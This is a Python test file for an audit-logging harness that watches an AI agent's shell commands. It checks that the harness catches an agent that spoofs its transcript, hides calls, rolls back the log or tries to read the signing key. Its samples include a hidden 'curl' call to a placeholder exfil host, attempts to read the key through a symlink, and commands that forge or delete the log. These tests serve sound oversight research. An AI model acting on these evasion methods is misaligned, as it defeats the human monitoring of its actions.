"""Week 2 tests: tool proxy, spoof cross-check (A5), anchoring against rollback (A6), naive baseline.

Layout in each test: ``agent/`` is the agent's workdir (it may edit anything there, including its
transcript); ``logger/`` holds the key, audit log and anchors, which the agent cannot touch.
"""

import json
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from audit_log import (
    AgentTranscript,
    AnchorStore,
    AuditLog,
    NaiveLog,
    ProxyClient,
    ToolProxy,
    cross_check,
    load_or_create_key,
    verify_log,
    verify_naive,
)
from audit_log.log import canonical_json

N_CALLS = 6
ANCHOR_EVERY = 3


def read_jsonl(path):
    return [json.loads(l) for l in path.read_text().splitlines() if l.strip()]


def write_jsonl(path, rows):
    path.write_text("".join(canonical_json(r) + "\n" for r in rows))


class HarnessTestCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.agent_dir = self.root / "agent"
        self.logger_dir = self.root / "logger"
        self.key = load_or_create_key(self.logger_dir / "key.hex")
        self.log_path = self.logger_dir / "audit.jsonl"
        self.anchors = AnchorStore(self.logger_dir / "anchors.jsonl")
        self.proxy = ToolProxy(
            self.agent_dir,
            AuditLog(self.log_path, self.key),
            self.anchors,
            ANCHOR_EVERY,
            protected_paths=[self.logger_dir],
        )
        self.transcript = AgentTranscript(self.agent_dir / "transcript.jsonl")

    def tearDown(self):
        self._tmp.cleanup()

    def run_and_record(self, command):
        result = self.proxy.run(command)
        self.transcript.record(result)
        return result

    def run_steps(self, n=N_CALLS):
        return [self.run_and_record("echo step-%d" % i) for i in range(n)]

    def check(self):
        return cross_check(self.transcript.path, self.log_path, self.key, self.anchors.all())


class ProxyTests(HarnessTestCase):
    def test_captures_output_and_exit_code(self):
        r = self.proxy.run("echo hello; echo oops 1>&2; exit 3")
        self.assertEqual(r.output, "hello\noops\n")
        self.assertEqual(r.exit_code, 3)
        self.assertFalse(r.truncated)

    def test_runs_in_agent_workdir(self):
        r = self.proxy.run("pwd")
        self.assertEqual(Path(r.output.strip()).resolve(), self.agent_dir.resolve())

    def test_timeout(self):
        self.proxy.timeout_s = 0.3
        r = self.proxy.run("sleep 5")
        self.assertEqual(r.exit_code, -1)
        self.assertIn("[timed out]", r.output)

    def test_truncates_large_output(self):
        self.proxy.max_output_bytes = 100
        r = self.proxy.run("head -c 1000 /dev/zero | tr '\\0' 'x'")
        self.assertTrue(r.truncated)
        self.assertEqual(len(r.output), 100)

    def test_every_call_is_logged_before_returning(self):
        results = self.run_steps()
        logged = [e["data"] for e in read_jsonl(self.log_path)]
        self.assertEqual([d["call_id"] for d in logged], [r.call_id for r in results])
        self.assertEqual(logged[2]["output"], "step-2\n")

    def test_anchors_every_n_calls_and_on_close(self):
        self.run_steps(7)
        self.proxy.close()
        self.assertEqual([a.length for a in self.anchors.all()], [3, 6, 7])
        self.assertTrue(verify_log(self.log_path, self.key, anchors=self.anchors.all()).ok)


class A5SpoofTests(HarnessTestCase):
    def test_honest_transcript_matches(self):
        self.run_steps()
        result = self.check()
        self.assertTrue(result.ok, result.issues + result.log.issues)

    def test_report_example_echo_real_returns_spooftest(self):
        # The agent actually runs a hidden command but writes the innocent-looking one in its transcript.
        self.run_steps(2)
        real = self.proxy.run("echo SPOOFTEST")
        self.transcript.record(real.__class__(real.call_id, "echo REAL; sleep 1", "REAL\n", 0, 0.0, False))
        self.run_steps(2)

        result = self.check()
        self.assertEqual(result.kinds(), {"spoof_command", "spoof_output"})
        self.assertEqual({i.line for i in result.issues}, {2})

    def test_edit_output_in_transcript(self):
        self.run_steps()
        rows = read_jsonl(self.transcript.path)
        rows[4]["output"] = "FLAG{legit}\n"
        write_jsonl(self.transcript.path, rows)

        self.assertEqual(self.check().kinds(), {"spoof_output"})

    def test_edit_exit_code_in_transcript(self):
        self.run_and_record("exit 1")
        rows = read_jsonl(self.transcript.path)
        rows[0]["exit_code"] = 0
        write_jsonl(self.transcript.path, rows)

        self.assertEqual(self.check().kinds(), {"spoof_exit_code"})

    def test_hidden_call(self):
        self.run_steps(3)
        self.proxy.run("curl -s http://example.invalid/exfil")  # run, but never written to the transcript
        self.run_steps(2)

        result = self.check()
        self.assertEqual(result.kinds(), {"hidden_call"})
        self.assertIn("exfil", result.issues[0].detail)

    def test_reordered_transcript(self):
        # Found by the week 3 experiment: matching by call_id alone ignored order.
        self.run_steps()
        rows = read_jsonl(self.transcript.path)
        rows[1], rows[4] = rows[4], rows[1]
        write_jsonl(self.transcript.path, rows)

        result = self.check()
        self.assertEqual(result.kinds(), {"reordered_call"})

    def test_fabricated_call(self):
        self.run_steps(3)
        with self.transcript.path.open("a") as f:
            f.write(canonical_json({"call_id": "deadbeef0000", "command": "./exploit", "output": "FLAG\n", "exit_code": 0}) + "\n")

        self.assertEqual(self.check().kinds(), {"fabricated_call"})

    def test_editing_both_transcript_and_audit_log_still_fails(self):
        # Even if the agent could somehow reach the audit log, it can't re-sign the edited entry.
        self.run_steps()
        for path, key in ((self.transcript.path, None), (self.log_path, "data")):
            rows = read_jsonl(path)
            (rows[1][key] if key else rows[1])["output"] = "FLAG{legit}\n"
            write_jsonl(path, rows)

        result = self.check()
        self.assertFalse(result.ok)
        self.assertIn("hash", result.kinds())


class A6RollbackTests(HarnessTestCase):
    def test_rollback_to_earlier_copy(self):
        self.run_steps(3)  # anchor taken at length 3
        snapshot = self.root / "snapshot.jsonl"
        shutil.copy(self.log_path, snapshot)
        self.run_steps(3)  # anchor taken at length 6
        shutil.copy(snapshot, self.log_path)

        result = verify_log(self.log_path, self.key, anchors=self.anchors.all())
        self.assertEqual(result.kinds(), {"anchor"})

    def test_rollback_is_invisible_without_anchors(self):
        self.run_steps(3)
        snapshot = self.root / "snapshot.jsonl"
        shutil.copy(self.log_path, snapshot)
        self.run_steps(3)
        shutil.copy(snapshot, self.log_path)

        self.assertTrue(verify_log(self.log_path, self.key).ok)

    def test_truncate_after_anchor(self):
        self.run_steps(6)
        write_jsonl(self.log_path, read_jsonl(self.log_path)[:4])

        result = verify_log(self.log_path, self.key, anchors=self.anchors.all())
        self.assertEqual(result.kinds(), {"anchor"})

    def test_growth_after_anchor_is_fine(self):
        self.run_steps(ANCHOR_EVERY + 2)  # two calls past the last anchor
        self.assertTrue(verify_log(self.log_path, self.key, anchors=self.anchors.all()).ok)


class SandboxTests(HarnessTestCase):
    """The agent's commands must not be able to read the key or touch the audit log/anchors."""

    def assertBlocked(self, result):
        self.assertNotEqual(result.exit_code, 0, result.output)
        self.assertIn("Operation not permitted", result.output)

    def test_cannot_read_key(self):
        r = self.proxy.run("cat ../logger/key.hex")
        self.assertBlocked(r)
        self.assertNotIn(self.key.hex(), r.output)

    def test_cannot_list_logger_dir(self):
        self.assertBlocked(self.proxy.run("ls ../logger"))

    def test_cannot_write_audit_log_or_anchors(self):
        self.run_steps(3)
        self.assertBlocked(self.proxy.run("echo forged >> ../logger/audit.jsonl"))
        self.assertBlocked(self.proxy.run("rm ../logger/anchors.jsonl"))

        # The log grew only by the proxy's own records of the two blocked attempts.
        commands = [e["data"]["command"] for e in read_jsonl(self.log_path)]
        self.assertEqual(len(commands), 5)
        self.assertIn("rm ../logger/anchors.jsonl", commands[-1])
        self.assertTrue(self.anchors.path.exists())
        self.assertTrue(verify_log(self.log_path, self.key, anchors=self.anchors.all()).ok)

    def test_cannot_read_key_through_symlink_or_absolute_path(self):
        self.proxy.run("ln -s ../logger sneaky")
        self.assertBlocked(self.proxy.run("cat sneaky/key.hex"))
        self.assertBlocked(self.proxy.run("cat '%s'" % (self.logger_dir / "key.hex").resolve()))

    def test_agent_workdir_still_usable(self):
        r = self.proxy.run("echo notes > notes.txt && cat notes.txt && rm notes.txt")
        self.assertEqual((r.exit_code, r.output), (0, "notes\n"))

    def test_refuses_to_run_unsandboxed(self):
        from audit_log import proxy as proxy_mod

        with mock.patch.object(proxy_mod, "SANDBOX_EXEC", "/nonexistent"), mock.patch.object(
            proxy_mod.shutil, "which", return_value=None
        ):
            with self.assertRaises(proxy_mod.SandboxUnavailable):
                ToolProxy(self.agent_dir, self.proxy.log, protected_paths=[self.logger_dir])
            with self.assertRaises(proxy_mod.SandboxUnavailable):
                self.proxy.run("echo hi")


class ProxyProcessTests(unittest.TestCase):
    def test_proxy_in_separate_process(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            logger = root / "logger"
            paths = dict(log_path=logger / "audit.jsonl", key_path=logger / "key.hex", anchor_path=logger / "anchors.jsonl")
            transcript = AgentTranscript(root / "agent" / "transcript.jsonl")

            with ProxyClient(root / "agent", anchor_every=2, **paths) as client:
                for i in range(4):
                    transcript.record(client.run("echo step-%d" % i))
                stolen = client.run("cat ../logger/key.hex")
                transcript.record(stolen)
                self.assertFalse(hasattr(client, "key"))

            key = load_or_create_key(paths["key_path"])
            self.assertNotEqual(stolen.exit_code, 0)
            self.assertNotIn(key.hex(), stolen.output)
            anchors = AnchorStore(paths["anchor_path"]).all()
            self.assertEqual([a.length for a in anchors], [2, 4, 5])
            self.assertTrue(cross_check(transcript.path, paths["log_path"], key, anchors).ok)


class NaiveBaselineTests(unittest.TestCase):
    """Documents what the baseline misses; week 3 measures this at scale."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.path = Path(self._tmp.name) / "agent" / "log.jsonl"
        log = NaiveLog(self.path)
        for i in range(6):
            log.append({"command": "echo step-%d" % i, "output": "step-%d\n" % i})

    def tearDown(self):
        self._tmp.cleanup()

    def test_clean(self):
        self.assertTrue(verify_naive(self.path).ok)

    def test_misses_edit(self):
        rows = read_jsonl(self.path)
        rows[2]["data"]["output"] = "SPOOFTEST\n"
        write_jsonl(self.path, rows)
        self.assertTrue(verify_naive(self.path).ok)

    def test_catches_plain_delete(self):
        rows = read_jsonl(self.path)
        del rows[2]
        write_jsonl(self.path, rows)
        self.assertEqual(verify_naive(self.path).kinds(), {"seq"})

    def test_misses_delete_with_renumbering(self):
        rows = read_jsonl(self.path)
        del rows[2]
        for i, r in enumerate(rows):
            r["seq"] = i
        write_jsonl(self.path, rows)
        self.assertTrue(verify_naive(self.path).ok)

    def test_misses_truncation(self):
        write_jsonl(self.path, read_jsonl(self.path)[:3])
        self.assertTrue(verify_naive(self.path).ok)


if __name__ == "__main__":
    unittest.main()
